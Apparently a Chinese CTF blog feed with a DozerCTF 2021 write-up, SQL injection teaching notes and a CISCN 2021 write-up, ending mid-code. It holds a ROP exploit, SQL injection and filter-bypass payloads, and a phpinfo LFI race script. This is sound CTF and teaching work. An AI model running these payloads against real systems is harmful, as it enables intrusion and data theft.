      <link href="article/dozerctf2021/"/>
      <url>article/dozerctf2021/</url>
      
        <content type="html"><![CDATA[<p>队伍名称：戈戈哥哥不鸽鸽</p><a id="more"></a><p>大师傅们都去打xctf了，几个比赛重时间了，春秋，美团，das。</p><p>在几个比赛中疯狂衔接2333</p><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="简单域渗透Ⅱ-1"><a href="#简单域渗透Ⅱ-1" class="headerlink" title="简单域渗透Ⅱ-1"></a>简单域渗透Ⅱ-1</h3><p>拿到题Lightcms，直接打。目前网上两个洞，一个v跨站脚本漏洞，一个后台RCE漏洞<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27112">CVE-2021-27112</a></p><p>dozer/dozer123登陆后台</p><img src="/article/dozerctf2021/image-20210530221322010.png" class="" title="image-20210530221322010" loading="lazy"><p>在<code>内容管理-&gt;文章-&gt;新建文章内容</code>处上传文件，抓包得到<code>/admin/neditor/serve/uploadimage</code>路由，然后在<code>/admin/neditor/serve/catchImage</code>路由读取文件，网上有很多RCE文章，不多阐述。<code>file_get_contents</code>直接用file协议读取根目录flag，后来flag被改名了，这里算是前期的做法了。</p><img src="/article/dozerctf2021/image-20210530221927944.png" class="" title="image-20210530221927944" loading="lazy"><img src="/article/dozerctf2021/image-20210530221918897.png" class="" title="image-20210530221918897" loading="lazy"><p>后面即使拿到了shell也没有进一步突破，扫ip还扫错了</p><img src="/article/dozerctf2021/image-20210530230130511.png" class="" title="image-20210530230130511" loading="lazy"><hr><h3 id="未完成的网站"><a href="#未完成的网站" class="headerlink" title="未完成的网站"></a>未完成的网站</h3><p>猜测点</p><p><code>./people/&#123;&#125;</code>和<code>./download?url=&#123;&#125;</code></p><p>试了下发现过滤了<code>[]</code></p><p>然后疯狂被域渗透折磨</p><hr><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="PwnPwnPwn"><a href="#PwnPwnPwn" class="headerlink" title="PwnPwnPwn"></a>PwnPwnPwn</h3><p>Exp:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 5.30, 2021"""</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> time<span class="token punctuation">,</span> sys<span class="token punctuation">,</span> base64context<span class="token punctuation">.</span>os <span class="token operator">=</span> <span class="token string">'linux'</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment"># p = process('./pwn')</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'1.14.160.21'</span><span class="token punctuation">,</span><span class="token number">20001</span><span class="token punctuation">)</span>main_addr <span class="token operator">=</span> <span class="token number">0x000000000401281</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x0000000000401313</span>pop_rsi_r15 <span class="token operator">=</span> <span class="token number">0x0000000000401311</span>bin_addr <span class="token operator">=</span> <span class="token number">0x000000000401199</span>sh_addr <span class="token operator">=</span> <span class="token number">0x0000000004011F9</span>sys_addr <span class="token operator">=</span> <span class="token number">0x000000000401176</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x78</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xB16BAD</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xBADF00D</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_r15<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xFEE1DEAD</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment"># gdb.attach(p)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><code>cat /flag</code>即可</p><img src="/article/dozerctf2021/image-20210530225342181.png" class="" title="image-20210530225342181" loading="lazy"><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="不会有人以为re那道才是签到吧"><a href="#不会有人以为re那道才是签到吧" class="headerlink" title="不会有人以为re那道才是签到吧"></a>不会有人以为re那道才是签到吧</h3><img src="/article/dozerctf2021/image-20210530222649894.png" class="" title="image-20210530222649894" loading="lazy"><p>手比较快</p><hr><h3 id="做个问卷吧"><a href="#做个问卷吧" class="headerlink" title="做个问卷吧"></a>做个问卷吧</h3><p>非常简单</p><hr><h3 id="funny-pixel"><a href="#funny-pixel" class="headerlink" title="funny_pixel"></a>funny_pixel</h3><p>听说国赛有一个running_pixel?</p><p>那就类比一下，发现几张图片类似，看一下md5，发现一共只有6种md5。猜测是二进制，提出来前16章，二进制为</p><p><code>01000100</code>==<code>d</code></p><p><code>01101111</code>==<code>o</code></p><p>很明显思路正确，写脚本就行了</p><p>exp：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 5月 30, 2021"""</span><span class="token keyword">import</span> hashlib<span class="token keyword">import</span> ospath <span class="token operator">=</span> <span class="token string">"./"</span>files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_file_md5</span><span class="token punctuation">(</span>fname<span class="token punctuation">)</span><span class="token punctuation">:</span>    m <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">#创建md5对象</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>fname<span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fobj<span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            data <span class="token operator">=</span> fobj<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span>                <span class="token keyword">break</span>            m<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data<span class="token punctuation">)</span>  <span class="token comment">#更新md5对象</span>    <span class="token keyword">return</span> m<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#返回md5对象</span><span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    list0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'5baa9d8a0912ddfbd29ac3786ef859f8'</span><span class="token punctuation">,</span><span class="token string">'d63f8a4a7a1d6c8b8f04e7d73797edf8'</span><span class="token punctuation">,</span><span class="token string">'6002507730ab969502579b66e9fda4b9'</span><span class="token punctuation">]</span>    list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'86f2fd64a8d1f6bfa0728be9e97a4a72'</span><span class="token punctuation">,</span><span class="token string">'000b14c847091094ae2777614f16f4c6'</span><span class="token punctuation">,</span><span class="token string">'4d8a4db35c3a27b36865750319f7cdfd'</span><span class="token punctuation">]</span>    result <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'result.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        text <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>        time <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> text<span class="token punctuation">:</span>            <span class="token keyword">if</span> i <span class="token keyword">in</span> list0<span class="token punctuation">:</span>                result <span class="token operator">+=</span> <span class="token string">"0"</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span> <span class="token string">"1"</span>            time <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">if</span> time<span class="token operator">%</span><span class="token number">8</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span> <span class="token string">" "</span>    result <span class="token operator">=</span> result<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>    res <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> result<span class="token punctuation">:</span>        res <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> pic_file <span class="token keyword">in</span> files<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">".png"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> pic_file<span class="token punctuation">:</span>            <span class="token keyword">continue</span>        pic <span class="token operator">=</span> get_file_md5<span class="token punctuation">(</span>pic_file<span class="token punctuation">)</span>        result<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>pic_file<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">".png"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> pic    result <span class="token operator">=</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> item<span class="token punctuation">:</span> item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"result.txt"</span><span class="token punctuation">,</span> <span class="token string">"w+"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> result<span class="token punctuation">:</span>            <span class="token keyword">if</span> i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>                res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Done!"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>    get_flag<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><img src="/article/dozerctf2021/image-20210530223305341.png" class="" title="image-20210530223305341" loading="lazy">]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入分享</title>
      <link href="article/sqlinjection/"/>
      <url>article/sqlinjection/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>小交流会的提纲，记录下，没有逻辑可言</p><p>今年本人参加的CTF中记录的sql题目，由于可能有多种解，这里列出本人解法仅供参考</p><table><thead><tr><th>比赛-题目名称</th><th>注入类型</th><th>详细情况</th></tr></thead><tbody><tr><td>MTCTF-sql</td><td>盲注</td><td>布尔型，同表查询</td></tr><tr><td>国赛CISCN-easy_sql</td><td>盲注，报错</td><td>sqlmap一把梭，布尔型/延时注入/报错注入，最后无列名注入</td></tr><tr><td>红帽杯-WebsiteManger</td><td>盲注</td><td>布尔型(异或)/延时注入</td></tr><tr><td>红明谷-happysql</td><td>盲注</td><td>布尔型(正则)，无列名注入</td></tr><tr><td>DASCTF三月赛-bestDB</td><td>联合注入</td><td>load_file()</td></tr><tr><td>V&amp;NCTF-realezjvav</td><td>盲注</td><td>延时注入(笛卡尔积)</td></tr><tr><td>HGAME-200OK!</td><td>联合注入</td><td>基础SQL注入</td></tr><tr><td>HGAME-Liki-Jail</td><td>盲注</td><td>延时注入</td></tr><tr><td>春秋杯新春欢乐赛-按F注入</td><td>联合注入</td><td>Pgsql，延时注入(也许)/信息外带/数据库外联</td></tr></tbody></table><p>打个广告，各比赛的WP，有需要的师傅可以看看</p><p><a href="https://err0r.top/article/cqb2021/">春秋杯2021新春欢乐赛一道题——按F注入 对pgsql的研究</a></p><p><a href="https://err0r.top/article/VN2021ctf/">V&amp;N2021公开赛</a></p><p><a href="https://err0r.top/article/mardasctf/">SQL无列名注入</a></p><p><a href="https://err0r.top/article/redhat2021/">红帽杯2021</a></p><p><a href="https://err0r.top/article/ciscn2021/">2021CISCN-WP</a></p><p>统计了一下今年的SQL注入题目，可能不全，从上表能看出大部分都是盲注，盲注的重要性可想而知。</p><hr><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><ol><li>version()——MySQL版本</li><li>user()——用户名</li><li>database()——数据库名</li><li>@@datadir——数据库路径</li><li>@@version_compile_os——操作系统版本</li></ol><p>最常用的一般是<code>database()</code>，有时候注意看<code>user()</code>，有些题目给的是root用户，需要用<code>load_file()</code>读文件，下面开始注入准备</p><hr><h2 id="测试注入"><a href="#测试注入" class="headerlink" title="测试注入"></a>测试注入</h2><table><thead><tr><th>测试字符串</th><th>变  种</th><th>预 期 结 果</th></tr></thead><tbody><tr><td>‘</td><td></td><td>触发错误。如果成功，数据库将返回一个错误</td></tr><tr><td>1’ or ‘1’=’1</td><td>1’) or (‘1’=’1</td><td>永真条件。如果成功，将返回表中所有的行</td></tr><tr><td>value’ or ‘1’=’2</td><td>value’) or (‘1’=’2</td><td>空条件。如果成功，将返回与原来的值相同的结果</td></tr><tr><td>1’ and ‘1’=’2</td><td>1’) and (‘1’=’2</td><td>永假条件。如果成功，将不返回表中任何行</td></tr><tr><td>1’ or ‘ab’=’a’+’b</td><td>1’) or (‘ab’=’a’+’b</td><td>SQL Server字符串连接。如果成功，将返回与永真条件相同的信息</td></tr><tr><td>1’ or ‘ab’=’a’ ‘b</td><td>1’) or (‘ab’=’a’ ‘b</td><td>MySQL字符串连接。如果成功，将返回与永真条件相同的信息</td></tr><tr><td>1’ or ‘ab’=’a’‖’b</td><td>1’) or (‘ab’=’a’‖’b</td><td>Oracle字符串连接。如果成功，将返回与永真条件相同的信息</td></tr></tbody></table><hr><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>盲注，就是指执行sql语句后返回值不直接回显到前端页面</p><hr><h2 id="过滤情况"><a href="#过滤情况" class="headerlink" title="过滤情况"></a>过滤情况</h2><h3 id="过滤select"><a href="#过滤select" class="headerlink" title="过滤select"></a>过滤select</h3><p>比较劲爆，如果有回显可以报错注入查出简单信息</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token operator">and</span> <span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span></code></pre><p><code>user()</code>/<code>database()</code>/<code>version()</code></p><ul><li>但这不行，可以利用堆叠注入绕过过滤</li></ul><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">tables</span><span class="token comment">#</span></code></pre><p>然后利用预编译方式查数据</p><p>经典题目：<a href="https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8">2019强网杯-随便注</a></p><ul><li><p>或者<code>alter</code>改表名，然后万能密码登陆出结果(如果可回显的话)</p></li><li><p>据说web端过滤也许可以preg_match回溯限制(有的情况)</p></li><li><p>同表的话可以同表查询</p><p>盲注字段名利用<code>left(column,0)</code></p><p>当存在字段时返回True</p></li></ul><p>基本过滤</p><table><thead><tr><th align="center">过滤</th><th align="center">替代方法</th></tr></thead><tbody><tr><td align="center">and</td><td align="center">&amp;</td></tr><tr><td align="center">or</td><td align="center">|</td></tr><tr><td align="center">[空格]</td><td align="center">/**/或()或%0a</td></tr><tr><td align="center">#</td><td align="center">–+</td></tr><tr><td align="center">substr()</td><td align="center">mid()、substring()</td></tr><tr><td align="center">ascii()</td><td align="center">hex()、bin()、ord()</td></tr><tr><td align="center">sleep()</td><td align="center">benchmark()</td></tr><tr><td align="center">group_concat()</td><td align="center">concat_ws()</td></tr><tr><td align="center">&lt;、&gt;</td><td align="center">greatest()</td></tr><tr><td align="center">limit n,m</td><td align="center">limit m offset n</td></tr></tbody></table><table><thead><tr><th>测试字符串</th><th>变  种</th><th>预 期 结 果</th></tr></thead><tbody><tr><td>‘</td><td></td><td>触发错误。如果成功，数据库将返回一个错误</td></tr><tr><td>1’ or ‘1’=’1</td><td>1’) or (‘1’=’1</td><td>永真条件。如果成功，将返回表中所有的行</td></tr><tr><td>value’ or ‘1’=’2</td><td>value’) or (‘1’=’2</td><td>空条件。如果成功，将返回与原来的值相同的结果</td></tr><tr><td>1’ and ‘1’=’2</td><td>1’) and (‘1’=’2</td><td>永假条件。如果成功，将不返回表中任何行</td></tr><tr><td>1’ or ‘ab’=’a’+’b</td><td>1’) or (‘ab’=’a’+’b</td><td>SQL Server字符串连接。如果成功，将返回与永真条件相同的信息</td></tr><tr><td>1’ or ‘ab’=’a’ ‘b</td><td>1’) or (‘ab’=’a’ ‘b</td><td>MySQL字符串连接。如果成功，将返回与永真条件相同的信息</td></tr><tr><td>1’ or ‘ab’=’a’‖’b</td><td>1’) or (‘ab’=’a’‖’b</td><td>Oracle字符串连接。如果成功，将返回与永真条件相同的信息</td></tr></tbody></table><h2 id="移位溢注"><a href="#移位溢注" class="headerlink" title="移位溢注"></a>移位溢注</h2><p>知道表名不需要知道字段名，一般没用，能用的时候都能用其他的注出来。</p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2021CISCN-WP</title>
      <link href="article/ciscn2021/"/>
      <url>article/ciscn2021/</url>
      
        <content type="html"><![CDATA[<p>Ciscn 2021</p><p>队伍名称：S3C_2021</p><a id="more"></a><h2 id="队伍情况"><a href="#队伍情况" class="headerlink" title="队伍情况"></a>队伍情况</h2><p><del>本菜鸡太菜，不值一提，希望分区赛能冲刺，争取进入总决赛(删了)</del></p><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h3><p>sql注入，sqlmap跑</p><img src="/article/ciscn2021/image-20210515121550955.png" class="" title="image-20210515121550955" loading="lazy"><p>根据log得知库名security</p><img src="/article/ciscn2021/image-20210515121644530.png" class="" title="image-20210515121644530" loading="lazy"><p>表名users，flag</p><img src="/article/ciscn2021/image-20210515121704337.png" class="" title="image-20210515121704337" loading="lazy"><p>payload：</p><pre class="language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span>'<span class="token punctuation">)</span><span class="token operator">+</span><span class="token operator">AND</span><span class="token operator">+</span>EXTRACTVALUE<span class="token punctuation">(</span><span class="token number">4078</span><span class="token punctuation">,</span>CONCAT<span class="token punctuation">(</span><span class="token number">0x5c</span><span class="token punctuation">,</span><span class="token number">0x717a7a7671</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span><span class="token operator">*</span><span class="token operator">+</span><span class="token keyword">from</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span><span class="token operator">*</span><span class="token operator">+</span><span class="token keyword">from</span><span class="token operator">+</span>flag<span class="token operator">+</span><span class="token keyword">as</span><span class="token operator">+</span>a<span class="token operator">+</span><span class="token keyword">join</span><span class="token operator">+</span>flag<span class="token operator">+</span><span class="token keyword">as</span><span class="token operator">+</span>b<span class="token operator">+</span><span class="token keyword">using</span><span class="token punctuation">(</span><span class="token keyword">no</span><span class="token punctuation">,</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">as</span><span class="token operator">+</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x717a6a7871</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+&amp;passwd=1&amp;Submit=%E7%99%BB%E5%BD%95</span></code></pre><p>同表查询得到列名id,no,200e6beb-a706-473f-add2-29e877c6ce25</p><p>最终</p><img src="/article/ciscn2021/1.jpg" class="" title="2ED72E0CF8ED07FBCB27F11F73A6187B" loading="lazy"><p>Flag:</p><pre class="language-none"><code class="language-none">CISCN&#123;63zs0-zMP27-bhZDu-kIEv3-AvlHh-&#125;</code></pre><hr><h3 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h3><p>原题：<a href="https://r0yanx.com/2020/10/28/fslh-writeup/">https://r0yanx.com/2020/10/28/fslh-writeup/</a></p><p>扫目录发现<code>.index.php.swo</code></p><p>可以利用 PHP 内置类中的 <code>ReflectionMethod</code> 来读取 <code>User</code> 类里面各个函数的注释</p><p>payload：</p><pre class="language-none"><code class="language-none">.&#x2F;?rc&#x3D;ReflectionMethod&amp;ra&#x3D;User&amp;rb&#x3D;q&amp;rd&#x3D;getDocComment</code></pre><img src="/article/ciscn2021/image-20210515124614970.png" class="" title="image-20210515124614970" loading="lazy"><p>Flag:</p><pre class="language-none"><code class="language-none">CISCN&#123;Ak4Z6-6GU0a-fAz0n-OTdYy-KDq4Q-&#125;</code></pre><hr><h3 id="middle-source"><a href="#middle-source" class="headerlink" title="middle_source"></a>middle_source</h3><p>扫目录发现<code>.listing</code></p><p>访问得到<code>you_can_seeeeeeee_me.php</code>，给了phpinfo</p><p>根据源码发现</p><p><code>$_POST[&quot;field&quot;];</code>和<code>echo $$field;</code>有出入</p><p>根据vulhub一个利用phpinfo进行文件包含的漏洞，改一下exp直接打</p><p><a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md</a></p><p>exp:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">import</span> threading<span class="token keyword">import</span> socket<span class="token keyword">def</span> <span class="token function">setup</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>    TAG<span class="token operator">=</span><span class="token string">"Security Test"</span>    <span class="token comment"># PAYLOAD = """%s\r</span>    <span class="token comment"># &lt;?php var_dump(scandir('/etc/ceffgbbgcd/chffbdjbag/cjdieddjcc/cajjfieifd/ajdfdccjdj/'));?>\r""" % TAG</span>    PAYLOAD<span class="token operator">=</span><span class="token triple-quoted-string string">"""%s\r&lt;?php var_dump(file_get_contents('/etc/ceffgbbgcd/chffbdjbag/cjdieddjcc/cajjfieifd/ajdfdccjdj/fl444444g'));?>\r"""</span> <span class="token operator">%</span> TAG    REQ1_DATA<span class="token operator">=</span><span class="token triple-quoted-string string">"""-----------------------------7dbff1ded0714\rContent-Disposition: form-data; name="123"; filename="test.txt"\rContent-Type: text/plain\r\r%s-----------------------------7dbff1ded0714"""</span> <span class="token operator">%</span> PAYLOAD    padding<span class="token operator">=</span><span class="token string">"G"</span> <span class="token operator">*</span> <span class="token number">5000</span>    REQ1<span class="token operator">=</span><span class="token triple-quoted-string string">"""POST /?a="""</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">""" HTTP/1.1\rCookie: PHPSESSID=1; othercookie="""</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">"""\rHTTP_ACCEPT: """</span> <span class="token operator">+</span> padding <span class="token operator">+</span> <span class="token triple-quoted-string string">"""\rHTTP_USER_AGENT: """</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">"""\rHTTP_ACCEPT_LANGUAGE: """</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">"""\rHTTP_PRAGMA: """</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">"""\rContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\rContent-Length: %s\rHost: %s\r\r%s"""</span> <span class="token operator">%</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>REQ1_DATA<span class="token punctuation">)</span><span class="token punctuation">,</span>host<span class="token punctuation">,</span>REQ1_DATA<span class="token punctuation">)</span>    <span class="token comment">#modify this to suit the LFI script  </span>    LFIREQ<span class="token operator">=</span><span class="token triple-quoted-string string">"""POST / HTTP/1.1\rUser-Agent: Mozilla/4.0\rProxy-Connection: Keep-Alive\rHost: %s\rContent-Type: application/x-www-form-urlencodedContent-Length: %s\r\r%s"""</span>    <span class="token comment">#print(REQ1)</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>REQ1<span class="token punctuation">,</span> TAG<span class="token punctuation">,</span> LFIREQ<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">phpInfoLFI</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> phpinforeq<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> lfireq<span class="token punctuation">,</span> tag<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    s2 <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>    s2<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>phpinforeq<span class="token punctuation">)</span>    d <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token operator">&lt;</span> offset<span class="token punctuation">:</span>        d <span class="token operator">+=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        i <span class="token operator">=</span> d<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">"[tmp_name] =&amp;gt; "</span><span class="token punctuation">)</span>        fn <span class="token operator">=</span> d<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">17</span><span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">31</span><span class="token punctuation">]</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">None</span>    fn<span class="token operator">=</span><span class="token string">"cf=../../../../../..&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span>    <span class="token comment">#print(fn)</span>    s2<span class="token punctuation">.</span>send<span class="token punctuation">(</span>lfireq <span class="token operator">%</span> <span class="token punctuation">(</span>host<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span><span class="token 